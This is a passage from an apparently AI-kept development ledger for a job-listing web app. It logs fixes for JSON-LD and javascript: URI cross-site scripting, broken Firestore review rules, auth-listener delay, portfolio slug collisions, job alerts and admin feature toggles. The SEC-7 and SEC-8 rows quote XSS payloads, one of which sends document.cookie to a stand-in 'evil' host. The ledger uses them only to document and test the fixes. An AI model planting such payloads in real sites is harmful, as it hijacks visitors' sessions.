`post-job/page.tsx`'s form handling, or any Firestore write path — the fix is entirely at the serialization boundary, matching how `sanitizeForJsonLd` itself only ever touches the string going into the script tag. Lanes: security, uiux, skill. **Collision check at claim:** worktrees = primary (`main`) + `Theni-Jobs-develop` (`6a29497`) + this one; `git branch --list 'thenijobs/*'` has no `sec7`/`jsonld`/`xss` overlap; `ACTIVE` rows = 0. Gate after the last phase-branch commit: fully green — typecheck 0 · lint 0 (681 warnings, standing baseline) · build 0 with real-firebase-config=yes · secrets:bundle 0 · secrets:src-literals 0 · tracked-artefacts 0. **Runtime probe, not just a passing build**: a standalone Node reproduction of the exact payload (`{title: 'Cook</script><script>alert(document.cookie)</script>'}`) confirmed plain `JSON.stringify` emits the literal, exploitable `</script>` substring, while `toJsonLdScript` does not — and confirmed `JSON.parse(toJsonLdScript(payload)).title === payload.title`, i.e. the escape is lossless for any consumer (Google's structured-data parser included) that reads it as JSON. Inspected the real build output at `out/jobs-in-chinnamanur.html` (static breadcrumb, byte-identical output pre/post-fix since it contains no `<`) and a real production job page `out/jobs/uxav4s0Kv7aT62DoflRt.html` (both `BreadcrumbList` and `JobPosting` JSON-LD blocks parse as valid JSON with the expected `@type` after the fix). **Revert-and-watch, in the phase worktree:** `git revert --no-commit 7d98815` brought back all fourteen raw `JSON.stringify` sites and deleted `src/lib/seo/jsonLd.ts`; `git revert --abort` restored the fix (`toJsonLdScript` used at all fourteen sites, `CompanyLandingPageClient.tsx`'s own `sanitizeForJsonLd()` untouched), `git status --porcelain` empty. | `thenijobs/sec8-javascript-uri-href-xss` | `bce48b4` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase SEC-8 | **Every `<a href={rawField}>` bound to a company's or seeker's own free-text URL field lets that account holder run arbitrary JavaScript in any visitor's browser, on this site's own origin, the moment the visitor clicks the link.** React does not sanitize `href` — a stored value of `javascript:fetch('https://evil/'+document.cookie)` renders as an apparently normal link and executes verbatim when clicked, with full access to `thenijobs.com`'s cookies/localStorage/DOM (including, if the visitor happens to be signed in, their Firebase Auth session state). Found immediately after `SEC-7`, sweeping every `href={<identifier expression>}` in `src/` for the same 'raw user text reaches a dangerous sink' shape, then classifying each by whether its source field is genuinely free text (a form input the account owner types) or internally constructed (a hardcoded route, a Storage `getDownloadURL()`, a string built from a fixed prefix). **Confirmed free-text and unvalidated on write** — none of the write paths for these fields (`register-business/page.tsx`, `employer/company-profile/page.tsx`, `SeekerSiteEditor.tsx`) checks the value's scheme, only `.trim()`: `company.website`/`.facebook`/`.instagram`/`.linkedin`, a company leader's `linkedinUrl`/`facebookUrl`/`twitterUrl`, a product/service's `websiteUrl`, a seeker's portfolio `resumeUrl` (hero section, free-text — separate from the actual Storage-backed resume upload on `seeker/resume/page.tsx`, which is safe), project `liveUrl`/`githubUrl`, certificate `link`/`credentialUrl`, work-sample `url`, a social-link `url`, and a portfolio 'careers' opening's `link`. **This codebase already has a partial, accidental mitigation in exactly two places, applied inconsistently even within the same file**: `src/app/company/[slug]/CompanyProfileClient.tsx:617` and `src/app/admin/businesses/page.tsx:787` both do `url.startsWith('http') ? url : \`https://${url}\`` — which happens to neutralise a bare `javascript:...` payload (it does not start with 'http', so it gets prefixed into the harmless `https://javascript:...`), apparently written only to let users skip typing `http://`, not as a deliberate security control (no comment, no test). The SAME file's own `:520` renders `company.website` completely raw, three lines of the same component. Every other site listed above has zero protection of any kind. Same shape as `SEC-7`'s `sanitizeForJsonLd()`: a correct idea sitting in one place, unexported, inconsistently applied, everywhere else exposed. **Fix**: new `src/lib/safeUrl.ts` exports `safeExternalUrl(url)`, which explicitly refuses any URL with a scheme other than `http`/`https` (not merely 'does not start with http', which is closer to correct but never states the actual security property), and still assumes `https://` for a bare domain, matching the existing UX. Applied at every read site listed above (11 files) including the two that already had the accidental guard, replacing it with the explicit, correct check. A site with a `|| '#contact'` fallback (`CorporatePremium.tsx`, `BusinessCareers.tsx`, a portfolio 'careers' Apply button) becomes `safeExternalUrl(job.link) || '#contact'`, preserving the fallback for a refused value instead of rendering a dead link. **Deliberately left out**: `seeker/notifications/page.tsx`'s `actionTarget = item.actionUrl || item.link` — grepped every `createNotification()` call site in `firestoreService.ts`/`adminNotify.ts` and found none that ever passes a caller-controlled URL (every `actionUrl` is a hardcoded internal route); left unconfirmed rather than assumed safe by omission from this list, but not touched given no live write path was found. `SeekerSiteEditor.tsx`'s own `portfolioUrl` (`:541`, `` `https://thenijobs.com/portfolio/${site.customUrl}` ``) is safe by construction — the string always starts with the hardcoded scheme, so no value of `customUrl` can change it — and is not touched. Expected files: new `src/lib/safeUrl.ts`; `src/app/company/[slug]/CompanyProfileClient.tsx`; `src/app/profile/page.tsx`; `src/app/admin/businesses/page.tsx`; `src/app/portfolio/seeker/[id]/SeekerPortfolioClient.tsx`; `src/components/portfolio/templates/{SeekerPortfolioRenderer,CleanCorporate,CorporatePremium,BusinessCareers}.tsx`; `src/components/company/ProductDetailModal.tsx`; `src/app/employer/candidates/page.tsx`; this ledger. Never touches any Firestore write path, `firestore.rules`, `register-business/page.tsx`, `employer/company-profile/page.tsx`, or `SeekerSiteEditor.tsx`'s form fields themselves — the fix is entirely at the render boundary, same as `SEC-7`. | `thenijobs/rules7-reviews-create-and-reply-always-denied` | `9ddde13` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase RULES-7 | **Submitting a company review has never once succeeded, for any user, ever — and a company owner replying to a review has the same structural gap.** `firestore.rules`'s `reviews/{reviewId}` `allow create` (`:236-238`) requires `request.resource.data.reviewerId == request.auth.uid` and `keys().hasAll(['reviewerId', 'companyId', 'rating'])`. The only write path to this collection, `src/components/company/CompanyReviewsSection.tsx`'s `handleSubmitReview()` (`:67-77`), writes `{ companyId, userId: user.uid, userName, userPhotoUrl, rating, title, content, status: 'pending', createdAt }` — there is no `reviewerId` key anywhere in that object. `hasAll(['reviewerId', ...])` is therefore false on every single submission, `allow create` evaluates to false, and Firestore denies the write outright. **The `reviewerId` field the rule checks belongs to a different, unused type**: `src/lib/types/index.ts:326`'s `Review` interface (`reviewerId`, `reviewerName`, `targetId`, `targetType`) — a grep for `reviewerId` anywhere in `src/` finds only that one declaration, never a read or a write. The type actually used everywhere this feature appears — `CompanyReviewsSection.tsx`, `CompanyReviewsManager.tsx`, `admin/reviews/page.tsx`, `employer/reviews/page.tsx` — is `CompanyReview` (`types/index.ts:158`), which correctly declares `userId`, matching the write. **The rules block was written against the wrong of the two types and has never matched the code that actually runs.** Not something a passing build or a lint pass could ever catch — `handleSubmitReview`'s own `catch` block (`:88-90`) turns the resulting `permission-denied` into a generic 'Failed to submit review. Please try again.' toast, indistinguishable from a transient network error. This also explains why `TRUST-12`'s real-average-rating computation and `TRUST-13`'s admin-approval-gated badge fix have had nothing to operate on in production: the `reviews` collection this app has always queried is, as far as this write path is concerned, permanently empty. **A second, independent gap in the same block**: `allow update` (`:239-241`) permits only the review's own author or an admin — `CompanyReviewsManager.tsx`'s `handleSendReply()`/`handleReport()` (`:29-58`), rendered on the EMPLOYER's own company-profile 'Reviews & Feedback' tab, updates `companyReply`/`adminNote` as the **company owner**, who is neither the review's author nor an admin — denied for the identical reason, a company can never reply to or flag a review about itself. Fix: correct `allow create`/`allow update`/`allow delete` to check `userId` (matching the real write shape), and add a narrowly-scoped third path to `allow update` — `isCompanyOwner(resource.data.companyId)` restricted to changing only `companyReply`/`adminNote` via `affectedKeys().hasOnly([...])`, so a company can reply to or flag a review about itself but cannot touch its own rating, content, or status. Matches this ruleset's own established pattern (`RULES-4`'s comment: 'this is not a new policy: applications, interviews, leads and conversations already authorise the employer side with isCompanyOwner(resource.data.companyId)'). Expected files: `firestore.rules`, this ledger. Never touches any `src/` file — the application code already matches its own `CompanyReview` type correctly; only the rules were wrong. Never touches `allow read` (`if true`) — public review readability, including currently-unfiltered `pending` ones, is a separate, lower-severity, pre-existing question (the app's own UI already filters `where('status', '==', 'approved')` for public display) out of scope for this fix. | `thenijobs/seeker1-browse-jobs-and-companies-inside-dashboard` | `c8d6945` | MERGED_DEVELOP | 2026-09-06 | owner (Job Seeker Panel modernization spec, 2026-09-06, phase P1 selected via AskUserQuestion) via phase SEEKER-1 | **Phase 1 of the Job Seeker Panel modernization the owner requested** (repository discovery report delivered in chat, not written to the repo — classified every requirement cluster against `develop`; owner picked this phase to build first). Three findings, all confirmed by reading the actual code rather than assuming the spec's premise: **(1) Browse Jobs / Companies redirect (CRITICAL per the spec)** — `src/app/seeker/layout.tsx:23,29` send the seeker dashboard's own nav items to `/jobs` and `/businesses`, top-level routes with the generic public `<Header/>`+`<BottomNav/>` shell, not the seeker sidebar. The search/filter/save/apply logic at both pages (`src/app/jobs/page.tsx`, `src/app/businesses/page.tsx`) is real and already auth-aware (`useAuth()`, live `savedJobs` state, working save/apply) — nothing there is broken, the seeker just loses the dashboard shell the moment they click. **(2) A rendered-but-fake 'Save Company' heart button** — `src/app/company/[slug]/CompanyProfileClient.tsx:24,109-121` toggles a bare `useState(false)` with no Firestore write at all; the preference is gone on refresh, silently. **(3) Dead code in the same file**: `const [followed, setFollowed] = useState(false)` (`:25`) is declared and never read or rendered anywhere — a grep for `followed`/`setFollowed` outside its own declaration returns nothing. **This codebase already has the real backing mechanism, proven and working elsewhere**: `followCompany()`/`unfollowCompany()`/`isFollowingCompany()` (`src/lib/firebase/firestoreService.ts:969-991`) against the `companyFollows` collection (secured by `RULES-6` this session), already wired correctly into `src/app/jobs/[id]/JobDetailPageClient.tsx`'s own follow toggle (`useEffect`+`isFollowingCompany` on mount, `handleToggleFollow` calling `followCompany`/`unfollowCompany`, a toast on each transition). No separate `savedCompanies` collection exists anywhere (grepped) — 'Save' and 'Follow' are the same one real relationship in this app's data model, just two different buttons in two different places using two different words for it. Fix: **(a)** extract `jobs/page.tsx`'s and `businesses/page.tsx`'s page bodies (everything between `<Header/>` and `<BottomNav/>`) into new shared components `src/components/jobs/JobsBrowseContent.tsx` and `src/components/businesses/BusinessesBrowseContent.tsx`, each taking an optional `embedded` prop (default `false`, behaviour-identical to today) that swaps the sticky offsets for use inside a shell that already has its own header, rather than duplicating ~1,100 lines of working search/filter logic into two new files, matching the 'reuse, extend' mandate the owner's spec itself states; **(b)** new `src/app/seeker/jobs/page.tsx` and `src/app/seeker/companies/page.tsx` rendering those components with `embedded`, inheriting the seeker dashboard's own layout/sidebar automatically (Next.js App Router: any page under `src/app/seeker/**` is wrapped by `src/app/seeker/layout.tsx`); **(c)** `StickySearchBar.tsx` gets one new optional `embedded?: boolean` prop (`sticky top-0` instead of `sticky top-16`) so the search bar doesn't reserve space for a public Header that isn't there; **(d)** `seeker/layout.tsx`'s two nav hrefs (`:23,29`) and its own separate hardcoded 'Browse Jobs' header link (`:229`) repointed to the new in-shell routes, `external: true` removed; **(e)** `CompanyProfileClient.tsx`'s Heart button wired to the real `followCompany`/`unfollowCompany`/`isFollowingCompany`, mirroring `JobDetailPageClient.tsx`'s proven pattern exactly (mount-time check, toast on toggle, hidden when the viewer is the company's own owner — this same component also renders the owner's own preview via `employer/company-profile/page.tsx`); the dead `followed` state removed. Expected files: `src/components/search/StickySearchBar.tsx`; new `src/components/jobs/JobsBrowseContent.tsx`; `src/app/jobs/page.tsx`; new `src/app/seeker/jobs/page.tsx`; new `src/components/businesses/BusinessesBrowseContent.tsx`; `src/app/businesses/page.tsx`; new `src/app/seeker/companies/page.tsx`; `src/app/seeker/layout.tsx`; `src/app/company/[slug]/CompanyProfileClient.tsx`; this ledger. **Scope extended during implementation, recorded here before the fix commit**: `src/app/seeker/saved-jobs/page.tsx` (2 links) and `src/app/seeker/dashboard/page.tsx` (3 links) also hardcoded `href="/jobs"` internally within the seeker portal — left pointing at the public route would have silently defeated this exact fix from the dashboard's own 'Browse all'/'Find jobs' buttons, so both files are repointed to `/seeker/jobs` in the same phase. Never touches `JobDetailPageClient.tsx` (the pattern being mirrored, already correct), `firestore.rules` (`RULES-6` already secured `companyFollows` correctly, no rule change needed for an existing collection), any job/company data model, or SEO metadata on the public `/jobs`/`/businesses` routes (unchanged, only their bodies moved into shared components with byte-identical default behaviour). | `thenijobs/auth1-remove-deferred-auth-state-init` | `4ddaf53` | MERGED_DEVELOP | 2026-09-06 | owner ("all the three", "fix everything", 2026-09-06, via phase AUTH-1) | **Investigated Doc 2 §9's claimed 'Google Sign-In succeeds, then lands back on the login page' bug against this codebase before assuming its premise, per that same document's own §2 rule and this skill's evidence discipline.** Read `AuthContext.tsx`'s `signInWithGoogle()`, `signInWithEmail()`, `useRequireAuth()`, and `login/page.tsx`'s post-login redirect effect in full. **The literal bug as described is NOT confirmed**: `login/page.tsx`'s only redirect-to-a-dashboard effect (`useEffect(() => { if (user) {...router.push...} }, [user, router, redirectUrl])`, `:91-98`) never pushes to `/login` itself, `signInWithPopup` failing surfaces a visible error message (`handleGoogleLogin`'s `catch`, `:306-317`) rather than silently returning to the login screen, and `useRequireAuth()` (`useAuth.ts:41-48`) correctly gates its own 'not authenticated → redirect' check behind `if (loading) return`, so it does not fire prematurely on a still-resolving auth check. **A related, independently real and reproducible bug was found instead, in the same subsystem**: `AuthContext.tsx`'s auth-state listener (`:122-178`) deliberately defers subscribing to `onAuthStateChanged` — 'so critical render and LCP complete first' — via `requestIdleCallback` with a **2000ms timeout**, or a 50ms `setTimeout` fallback where `requestIdleCallback` doesn't exist. Until that deferred subscription finally fires, `loading` stays `true` for any visitor who has no `tj_cached_user` cache entry (every first sign-in, every private/incognito window, anyone who ever clears storage) is set to `false` immediately by the fast-path with `user` still `null` — and, critically, **`src/components/navigation/Header.tsx:239` renders its 'Sign In' button whenever `!mounted || !user`**, meaning every already-logged-in returning visitor sees 'Sign In' instead of their own account in the header, on every single page load, for up to two full seconds — a real, reproducible flash-of-wrong-content on every page, not a hypothetical. It also means a sign-in's own forward redirect (driven by the same `user` state Header reads) can appear to do nothing for the same window, which is very plausibly what generated the 'nothing happened, I'm still on login' report Doc 2 describes, even though the mechanism is a delay rather than a hard bounce-back. **The defer buys no actual LCP benefit for the pages that matter**: every `/seeker`, `/employer`, and `/admin` page already gates its real content behind `if (loading) return <Spinner/>` (`useRequireAuth`'s own `loading` flag), so those pages show a spinner regardless of whether the auth check took 5ms or 2000ms — deferring it only delays when the spinner can turn into real content, trading a real, user-visible correctness/responsiveness cost for an LCP metric it does not actually improve where content is gated on it anyway. Fix: subscribe to `onAuthStateChanged` immediately in the effect (removing the `requestIdleCallback`/`setTimeout` wrapper entirely) — exactly what Firebase's own documentation recommends and what the rest of this codebase's Firestore listeners already do without a defer. The listener itself remains async and cheap (a single subscription call); only the artificial scheduling delay is removed. The existing `tj_cached_user` fast-path (instant optimistic guess while the real check runs) is untouched. Expected files: `src/contexts/AuthContext.tsx`, this ledger. Never touches `login/page.tsx`, `useAuth.ts`, `Header.tsx`, `useRequireAuth`'s own logic, or any Google/email/phone sign-in method itself — the fix is entirely about when the listener subscribes, not what it does once subscribed. **Not claimed**: that this is definitively the exact mechanism behind whatever a real user reported to produce Doc 2 §9's wording — that specific report, if one exists outside the spec document, was not available to verify against. What is claimed: a real, reproducible, verified-by-reading delay existed in the same subsystem with the same visible symptom class (auth state appearing not to have taken effect), and removing an unjustified artificial delay is safe and strictly improves responsiveness with no compensating LCP benefit lost. Lanes: security, uiux, feedback, skill. **Collision check at claim:** worktrees = primary (`main`) + `Theni-Jobs-develop` (`dee0992`) + this one; `git branch --list 'thenijobs/*'` has no `auth1`/`google`/`signin` overlap; `ACTIVE` rows = 0. Lanes: security PASS (no change to what is authenticated or how, only when the listener subscribes), uiux PASS (Header.tsx's own conditional render logic is unchanged; it now simply receives the correct `user` value sooner), feedback PASS, skill PASS. **Not verified:** no live timing measurement (e.g. a real page load with devtools open) confirming the exact before/after delay in milliseconds — this environment's browser preview cannot reach any worktree, and the effect is a scheduling change verified by reading the exact API used (`requestIdleCallback`'s documented behavior deferring work until the browser is idle or a timeout elapses) rather than measured empirically. | `thenijobs/seeker2-portfolio-slug-uniqueness` | `76066ef` | MERGED_DEVELOP | 2026-09-06 | owner ("all the three", "fix everything", 2026-09-06, via phase SEEKER-2) | **Two seekers can end up with the same public portfolio URL, and it happens by default, not only by a deliberate typing collision.** Found during the Job Seeker Panel discovery report's slug section: `SeekerSiteEditor.tsx`'s `customUrl` input (`:1602-1611`) sanitizes the typed characters but never checks whether another seeker already has that value, and — the more severe half — **the very first portfolio a seeker ever gets auto-created with (`loadSeekerSite()`'s 'else' branch, `:147-159,356`) derives its default `customUrl` from `displayName`/email prefix with zero uniqueness check at all**: two seekers named similarly (or whose email prefixes normalize the same way, e.g. `raj.kumar@`/`raj_kumar@` both become `raj-kumar`) are silently given the identical `customUrl` the instant they first open the portfolio builder, before either has typed anything. `PublicPortfolioPageClient.tsx`'s lookup (`where('customUrl','==',username), limit(1)`) then returns whichever one document Firestore's index happens to return first — the other seeker's portfolio, published or not, becomes unreachable at their own intended URL with no error shown to either party. **Companies already solved this exact problem, this session (RULES-1, D-SLUG)**: a public `companySlugs/{slug}` reservation collection, checked with a `getDoc` before `register-business/page.tsx`/`company/register/page.tsx` write the company, then reserved with a `setDoc` after. Portfolios need the same idea with one structural difference registration doesn't: a company's slug is chosen once at registration and never changes, but a seeker can retype `customUrl` in the editor an unlimited number of times via the same `handleSave()` (`:405-426`) that saves every other field — so the reservation must also be **released** when the seeker moves away from a slug, not just claimed once, or an abandoned slug would stay permanently blocked forever, including against the same seeker switching back to it. Fix: new `portfolioSlugs/{slug}` collection (`firestore.rules`), narrower than `companySlugs` in exactly the one place the difference matters — the reservation's own owner may `delete` it (companies' reservations are owner-fixed and only admin-touchable, since they never change); `SeekerSiteEditor.tsx` tracks the last-saved slug in a ref, and on `handleSave()` — only when `customUrl` actually changed since the last save — checks `portfolioSlugs/{newSlug}` (refuse if owned by someone else, small reserved-word list checked first: `seeker` collides with the existing static route `/portfolio/seeker/[id]`), reserves the new slug, and releases the old one. The **initial auto-generated default** gets the identical availability check plus a numeric suffix loop (`raj-kumar`, `raj-kumar-2`, `raj-kumar-3`, ...) so two similarly-named seekers never collide from the moment their portfolio is first created, before they have touched anything. Expected files: `firestore.rules`, `src/components/portfolio/SeekerSiteEditor.tsx`, this ledger. Never touches `companySlugs` (a working, different-shaped reservation staying exactly as RULES-1 left it), `PublicPortfolioPageClient.tsx`'s lookup query (already correct once the data it reads is unique), any company-side portfolio/template code, or the portfolio theme/section system. | `thenijobs/seeker4-job-matching-and-alert-notifications` | `5b81743` | MERGED_DEVELOP | 2026-09-06 | owner ("all the three", "fix everything", 2026-09-06, via phase SEEKER-4) | **'Smart Job Matching' and 'Job Alerts' are 100% missing beyond a preferences form that nothing ever reads.** `src/app/seeker/job-alerts/page.tsx` has full CRUD against the `jobAlerts` collection (`title`, `category` — actually a free-text keyword field despite its label, `district` — a real `TN_DISTRICTS` dropdown, `jobType`, `emailEnabled`/`whatsappEnabled`/`pushEnabled`, `status`) — a grep for `jobAlerts` outside that one file returns **zero** hits anywhere else in `src/`. `approveJob()` (`firestoreService.ts:746-779`) notifies only the job's own poster; no matching pass, no fan-out, ever runs. Separately, the seeker dashboard's 'Recommended jobs' (`seeker/dashboard/page.tsx:70-71`) is literally `where('isActive','==',true)` — the identical generic feed as every other job listing, mislabeled as personalized. **Also discovered while designing the matcher**: the job-alerts `jobType` dropdown offers `'Full-time'/'Part-time'/'Contract'/'Freelance'`, while real job documents store `jobType` as `'full_time'/'part_time'/'internship'/'remote'/'work_from_home'/'fresher'/'contract'` (`post-job/page.tsx:30-38`) — different casing, different separator, and 'Freelance' has no corresponding job value at all. An exact-string match between the two would never fire; the matcher normalizes both sides instead of assuming they already agree. Fix: a deterministic, explainable matcher — `jobMatchesAlert(job, alert)` in `firestoreService.ts` — where every field the seeker actually set on their alert must match (AND, not a weighted score nobody could debug): `title` (always present, required at alert creation) is checked as a keyword against the job's own title/category; `category` likewise; `district` is an exact, normalized-case match; `jobType` goes through a small alias table mapping both the alert dropdown's and the job form's real values to one canonical form before comparing. `approveJob()` is rewritten around a **Firestore transaction** — reads the job's current `status` and only performs the approval write (and every downstream notification) if it is not already `'active'` — closing the exact 'admin clicks approve twice → duplicate alerts' race the owner's spec calls out by name (Doc 2 §70/§76): a client-side flag cannot prevent two near-simultaneous calls from both passing a plain read-then-write check, a transaction can, and does. On a genuine (non-duplicate) approval, `notifyMatchingJobAlerts()` queries every `status == 'active'` alert, and creates a real `type: 'job_match'` notification (via the already-real, already-working `createNotification()`/`NotificationContext`) for each seeker whose alert matches, deep-linking to `/jobs/{jobId}` — no email/WhatsApp/push, since no provider for any of those exists anywhere in this repository (confirmed, grepped) and the owner's own spec explicitly says not to fake a channel that isn't there; those three toggles on the alert stay exactly as inert as they are today. The dashboard's 'Recommended jobs' reuses the identical `jobMatchesAlert()` against the seeker's own active alerts, when they have any, instead of a second, competing matching implementation; a seeker with no alerts yet still sees the general active-jobs feed, now labelled 'Latest jobs' rather than 'Recommended', so the page never claims personalization it isn't doing. Expected files: `src/lib/firebase/firestoreService.ts` (matcher + rewritten `approveJob`), `src/app/seeker/dashboard/page.tsx` (reuse the matcher, honest label on the fallback), this ledger. Never touches `src/app/seeker/job-alerts/page.tsx` (its CRUD already works correctly — only what reads its data changes), `firestore.rules` (the `notifications` collection's existing unconditional `isAdmin()` create branch already permits an admin-run approval to notify any seeker; `jobAlerts`'s own rules already correctly scope read/write to the owner), `rejectJob()`, or any email/WhatsApp/push integration (none exists; not attempted). Lanes: security, uiux, feedback, skill. **Collision check at claim:** worktrees = primary (`main`) + `Theni-Jobs-develop` (`626524e`) + this one; `git branch --list 'thenijobs/*'` has no `seeker4`/`match`/`alert` overlap besides unrelated, already-merged branches (`fix2`, `pay1`, `seo6`); `ACTIVE` rows = 0. The double-click transaction guard rests on Firestore's own documented transaction-serialization guarantee (the same evidence class already used for `SEC-6`/`RULES-7`'s platform-behavior reasoning) rather than an empirical race reproduction, since simulating two genuinely concurrent Firestore transactions needs a live backend this environment's JDK-17-only emulator situation still cannot run. **Revert-and-watch, in the phase worktree:** `git revert --no-commit 5b81743` removed every `jobMatchesAlert`/`runTransaction`/`notifyMatchingJobAlerts` reference from both files; `git revert --abort` restored the fix (7 matches in `firestoreService.ts`, 2 in `dashboard/page.tsx`), `git status --porcelain` empty. Every external `link`/`imageUrl` an entry can carry goes through the already-proven `safeExternalUrl` (SEC-8) from the moment it's written, not retrofitted after. Because more than one `custom` section can exist per portfolio, a new `updateSectionById(id, dataUpdater)` and `updateSectionTitleById(id, title)` are added alongside the existing type-keyed `updateSectionData()` (which applies one update to every section sharing a type — correct for the singleton `achievements` section, wrong for multiple independent `custom` ones). Expected files: `src/lib/types/portfolio.ts` (two new interfaces), `src/components/portfolio/SeekerSiteEditor.tsx` (new section in the initial-creation branch, two new editor tabs, the id-keyed update/add/remove helpers), `src/components/portfolio/templates/SeekerPortfolioRenderer.tsx`, `src/components/portfolio/templates/SeekerPortfolioMinimal.tsx`, `src/components/portfolio/templates/SeekerPortfolioExecutive.tsx` (render both section types in all three), this ledger. | `thenijobs/seeker7-section-add-remove-show-hide-reorder` | `7de0b6e` | MERGED_DEVELOP | 2026-09-06 | owner ("continue... exact 30 seconds interval unit all the bugs sloved in the prompt i gave in the begging", 2026-09-06, via phase SEEKER-7) | **SEEKER-3B's own claim row flagged this as a bigger, separate undertaking: `SeekerSiteEditor.tsx` has zero mechanism to add, remove, show/hide, or reorder any of the eight already-existing standard sections (hero, about, skills, experience, education, projects, certifications, contact) — the section list is fixed forever at whatever `loadSeekerSite()`'s new-site branch wrote once.** Verified the architecture before building, per this skill's own doctrine, and found the real scope is narrower than Doc 1's literal ask in one specific way: **reorder cannot be built honestly right now.** Grepped all three seeker templates (`SeekerPortfolioRenderer.tsx`, `SeekerPortfolioMinimal.tsx`, `SeekerPortfolioExecutive.tsx`) for `.order`/`sort(` — **zero hits in all three**. Each template hardcodes a fixed JSX layout order per section type; none of them iterate `site.sections` sorted by its own `order` field. A drag-and-drop (or up/down) reorder control would write to a field nothing reads — the exact 'unwired feature' anti-pattern this session has spent this whole programme finding and fixing, this time in the write direction. Building it now would be dishonest UI. Split into a new, separate follow-up phase (**SEEKER-8**, logged in `BACKLOG.md`) that rewrites all three templates to render sections dynamically by `order` — a materially bigger, riskier change touching every section's markup in every template, not attempted here. **Also found and scoped around**: Hero and Contact cannot be safely hidden either, and inconsistently so across templates — `SeekerPortfolioRenderer.tsx` gates both (`{heroSection && (`, `{contactSection && (`, lines 174/775) so hiding them removes the block entirely, but `SeekerPortfolioMinimal.tsx` and `SeekerPortfolioExecutive.tsx` render their `<header>`/`<footer>` unconditionally as page structure and fall back to generic placeholder text (`heroData.name || 'Professional Seeker'`) when the section is hidden or missing — a seeker hiding Hero would see it vanish under one theme and turn into a stranger's-name-shaped placeholder under the other two. Excluding Hero and Contact from this phase's section manager (both stay permanently visible, matching how every portfolio needs an identity and a way to reach the person anyway) avoids shipping a control that behaves differently per theme. Confirmed `visible`-based show/hide **is** correctly wired and consistent across all three templates for the other six standard sections plus the already-built `achievements` (`getSection()`'s `s.visible` filter, each block additionally gated on its own derived list's `.length > 0`, e.g. `{skillsSection && skillsList.length > 0 && (`) — real scope for this phase: **show/hide + remove + re-add for about, skills, experience, education, projects, certifications, and achievements** (7 of the 8; hero and contact excluded per above; custom keeps its own already-built add/remove from SEEKER-3B, not duplicated here). Fix: a new 'Page Sections' manager panel at the top of the Blocks & Content tab listing every standard section — hero/contact shown with a locked 'Always visible' badge and no controls; the seven removable ones get an Eye/EyeOff visibility toggle (new `setSectionVisibleById(id, visible)`) and a Trash remove button (reusing the existing `removeSectionById` from SEEKER-3B, with the same `confirm()` guard); any of the six freely-removable standard types not currently present gets an explicit 'Add back' button (new `addStandardSection(type)`, mirroring `updateSectionData()`'s own existing auto-append-if-missing default shape so re-adding here and simply typing content in that type's own tab produce an identical section object either way). `achievements` is removable through the same panel (`removeSectionById`) but re-adds itself automatically the moment a seeker adds an achievement entry in its own tab, via the auto-append path SEEKER-3B already built — no separate 'Add back' button needed for it. | `thenijobs/doc2-1-admin-settings-killswitches` | `e5ec6db` | MERGED_DEVELOP | 2026-09-06 | owner ("Start Doc 2's backlog", 2026-09-06, via AskUserQuestion after seeker-platform-2026-09 closed, phase DOC2-1) | **First phase of Doc 2's backlog** (the larger 163-section Complete Production Audit spec, started after the owner authorized it once seeker-platform-2026-09 closed). **Re-investigated fix-2026-09's own already-recorded OPS-1 finding fresh before writing any code**, per this skill's doctrine, and found the scope undersold: `src/app/admin/settings/page.tsx` persists SIX distinct concerns to `platformSettings/global` (`districts`, `categories`, `aiFeatures`, `maintenance`, `revenueShare`, `features` — `registrationEnabled`/`jobPostingEnabled`/`reviewsEnabled`/`leadFormsEnabled`), and grepping for every one of them outside this single file returns **zero hits except `TN_DISTRICTS`** (a separate, hardcoded constant this page's `districts` editor does not touch at all). **Per-item verified disposition, not a blanket build-or-remove**: `districts`/`categories` are architecturally stuck, not merely unwired — the platform's real location taxonomy is baked into static `jobs-in-<district>` App Router directories (one page per district, pre-built at deploy time) and the separate `TN_DISTRICTS` constant every job form/filter actually reads; an admin-editable list here could never propagate to add or remove a real page without a code deploy regardless of Firestore wiring, so building it out would be actively misleading. `aiFeatures` (`recommendations`/`resumeAnalysis`/`smartSearch`) has no clean, unambiguous mapping onto the app's real 15 `AIFeatureKey` values (`src/lib/ai/config.ts`) — wiring it would mean inventing a mapping, a design decision beyond a mechanical fix. `revenueShare` has no marketplace-commission calculation anywhere in the codebase to consume it (grepped: zero hits beyond this page). `features.leadFormsEnabled` has nothing to gate either — confirmed by re-checking LEADS-1's own still-true finding: no `createLead`/`addLead`/`submitLead` call site exists anywhere in the client. All five are removed from the settings UI as decorative, with the reasoning above, rather than silently left half-working. **`maintenance` is deliberately NOT touched in this phase** — it is the one item genuinely worth building, but it can gate the *entire site* for *every visitor* if implemented with any bug, a materially higher blast radius than the other three; split into its own phase (`DOC2-2`, `BACKLOG.md`) for a careful, fail-safe-by-default design rather than bundled in here. **What IS built for real**: `registrationEnabled` (gates `/register` and `/register-business`), `jobPostingEnabled` (gates `/employer/post-job`), and `reviewsEnabled` (gates `CompanyReviewsSection.tsx`'s 'Write a Review' entry point) — each has exactly one clear, well-defined consuming surface, unlike the five removed. Firestore mechanism: `platformSettings/global` stays exactly as-is (admin-only, unchanged write target, no data migration, no risk to whatever an admin may have already saved there) — the settings page now ALSO dual-writes the `features` object to a new, narrowly-scoped `platformSettings/public` document (public read, admin write) whenever saved, since `/register`, `/register-business`, and the public company page's review section are all reachable by unauthenticated visitors who cannot read the admin-only `global` doc. Every consuming page defaults to the feature being ENABLED (fail-open toward normal operation, not fail-closed toward blocking real users) when the `platformSettings/public` doc does not yet exist or a specific key is missing — a missing document must never accidentally lock out registration, job posting, or reviews for every visitor. Expected files: `src/app/admin/settings/page.tsx` (remove 5 decorative sections/tabs, dual-write `features` to the new public doc), `firestore.rules` (new `platformSettings/public` block), `src/app/register/page.tsx`, `src/app/register-business/page.tsx`, `src/app/employer/post-job/page.tsx`, `src/components/company/CompanyReviewsSection.tsx` (each reads `platformSettings/public` and gates its own entry point), this ledger. Never touches `maintenance` (DOC2-2), `platformSettings/global`'s existing write shape (unchanged, no migration), ADS-1/LEADS-1's own dashboards (separate, not-yet-scoped decisions), or PAYMENT-1/CREDIT-1 (explicitly out of scope — needs a backend the owner chose not to build yet).
